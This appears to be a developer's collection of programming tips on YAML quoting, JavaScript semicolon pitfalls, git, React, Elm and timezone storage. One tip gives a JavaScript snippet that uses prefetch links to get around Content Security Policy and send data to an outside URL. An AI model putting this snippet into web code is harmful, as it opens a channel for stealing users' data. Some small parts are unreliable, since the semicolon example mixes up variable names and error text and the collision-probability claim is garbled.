**When to use quotes in YAML (why is this so complicated?)**

In general, you don't need quotes. However, you should use them...
* to force a string, e.g. if your key or value is 10 but you want it to return a String and not a Fixnum, write '10' or "10".
* if your value starts with special characters: (`:`, `{`, `}`, `[`, `]`, ,`,`, `&`, `*`, `#`, `|`, `-`, `>`, `=`, `!`, `%`, or `@`)
* if your value ends with special characters: (`:` or `#`)
* "`Yes`" and "`No`" should be enclosed in quotes (single or double) or else they will be interpreted as `TrueClass` and `FalseClass` values

> Single quotes let you put almost any character in your string, and won't try to parse escape codes. `'\n'` would be returned as the string `\n`.

> Double quotes parse escape codes. `"\n"` would be returned as a line feed character.

> Seems to me that the best approach would be to not use quotes unless you have to, and then to use single quotes unless you specifically want to process escape codes. **Yeah, but then I have to consult this list every time!** ðŸ˜¡ðŸ˜¡ðŸ˜¡

**ASI Edge-Cases**

> Function return statement

```js
function a() {
  return
  "Nope, I am sorry!"
}

a() // undefined
```

> Line starting with parenthesis

```js
const b = 1
(function() { console.log('Old school module pattern!') })()

// Uncaught TypeError: 1 is not a function
```

> Line starting with angle brackets

```js
const squared = []
[1, 2].forEach(i => c.push(i * 2))

// Uncaught TypeError: Cannot read property 'map' of undefined
```

You can use cherry-pick a range of commits!

You can rename branches! `git branch -m NEW_BRANCH_NAME`

How to deal with conflicts in yarn.lock files:
* git checkout BASE_BRANCH -- yarn.lock
* yarn install

```

You can conditionally add elements/properties to Arrays/Objects:

```js
const cond = false;
const arr = [
  ...(cond ? ['a'] : []),
  'b',
];
```

```js
const cond = false;
const obj = {
  ...(cond ? {a: 1} : {}),
  b: 2,
};
```

---

You can omit properties with pure ES6
```js
const myObject = {
  a: 1,
  b: 2,
  c: 3
};
const { a, ...noA } = myObject;
console.log(noA); // => { b: 2, c: 3 };
```

JSON is NOT a subset of Javascript!

When generating scoped class names, using 6 digits is a good rule of thumb. this will give you 0.001% certainty of zero collisions as long as you donâ€™t have more than 1,172 class names.

Functional core, imperative shell - A way to design systems which isolates side-effectful code from pure functional code. Impure functions should call pure functions, but not the other way around.
Functional core: handles decisions (lots of paths, little/no dependencies)
Imperative shell: handles dependencies (lots of dependencies, few paths)

Stateless function components cannot use pureRender (they are re-rendered whenever their parent changes, regardless of whether or not their props have changed.

Workaround:
```jsx
const pure = func =>
  class PureComponentWrap extends React.PureComponent {
    render() {
      return func(this.props, this.context);
    }
  }

const MyComponent = ({msg}) =>
  <span>{msg}</span>

const MyComponentPure = pure(MyComponent);
```

You can simulate objects in Elm!

```elm
import Html exposing (text)

point = \x y -> { multiply = \multiplier -> (x * multiplier, y * multiplier) }

showAge { age, name } = name ++ " is " ++ (toString age) ++ " years old"

z = { age = 21, name = "Shady" }

f = { id = \x -> x }

myPoint = point 1 3
(_, y) = myPoint.multiply 4

main = y |> toString |> text
```

You can circumvent CSP in JavaScript for exfiltrating data!

```js
const linkEl = document.createElement('link');
linkEl.rel = 'prefetch';
linkEl.href = urlWithYourPreciousData;
document.head.appendChild(linkEl);
```

CSP doesn't restrict `prefetch`, `prerender`, `dns-prefetch`, or `preconnect`

Timezone Stuffs

```
1994-11-05T08:15:30-05:00 corresponds to November 5, 1994, 8:15:30 am, US Eastern Standard Time.

1994-11-05T13:15:30Z corresponds to the same instant.
```

**Do**

- Whenever you are referring to an exact moment in time, persist the time according to a unified standard that is not affected by daylight savings. (GMT and UTC are equivalent with this regard, but it is preferred to use the term UTC. Notice that UTC is also known as Zulu or Z time.)
- If instead you choose to persist a time using a local time value, include the local time offset for this particular time from UTC (this offset may change throughout the year), such that the timestamp can later be interpreted unambiguously.
- In some cases, you may need to store both the UTC time and the equivalent local time. Often this is done with two separate fields, but some platforms support a datetimeoffset type that can store both in a single field.
- When storing timestamps as a numeric value, use Unix time - which is the number of whole seconds since 1970-01-01T00:00:00Z (excluding leap seconds). If you require higher precision, use milliseconds instead. This value should always be based on UTC, without any time zone adjustment.
If you might later need to modify the timestamp, include the original time zone ID so you can determine if the offset may have changed from the original value recorded.
- When scheduling future events, usually local time is preferred instead of UTC, as it is common for the offset to change. See answer, and blog post.
- When storing whole dates, such as birthdays and anniversaries, do not convert to UTC or any other time zone.

**Don't**

- Do not confuse a "time zone", such as America/New_York with a "time zone offset", such as -05:00. They are two different things. See the timezone tag wiki.
- Do not use JavaScript's Date object to perform date and time calculations in older web browsers, as ECMAScript 5.1 and lower has a design flaw that may use daylight saving time incorrectly. (This was fixed in ECMAScript 6 / 2015).
- Never trust the client's clock. It may very well be incorrect.
- Don't tell people to "always use UTC everywhere". This widespread advice is shortsighted of several valid scenarios that are described earlier in this document. Instead, use the appropriate time reference for the data you are working with. (Timestamping can use UTC, but future time scheduling and date-only values should not.)
